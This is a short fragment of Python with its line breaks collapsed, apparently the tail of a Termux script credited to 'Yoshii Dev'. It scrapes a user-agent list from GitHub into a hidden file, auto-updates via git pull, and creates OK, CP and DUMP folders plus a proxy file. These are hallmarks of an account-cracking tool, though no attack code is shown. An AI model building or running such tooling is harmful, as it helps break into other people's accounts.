ua:			ugen.append(ub)	except:		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text		ua=open('.bbnew.txt','w')		aa=re.findall('line">(.*?)<',str(a))		for un in aa:			ua.write(un+'\n')		ua=open('.bbnew.txt','r').read().splitlines()		pess = "Yoshii Dev";lines = "Creator"if __name__=='__main__':	try:os.system('git pull')	except:pass	try:os.mkdir('OK')	except:pass	try:os.mkdir('CP')	except:pass	try:os.mkdir('/sdcard/DUMP')	except:pass	try:os.system('touch .prox.txt')	except:pass	try:os.system('clear')	except:pass	YoshiiXhurayra()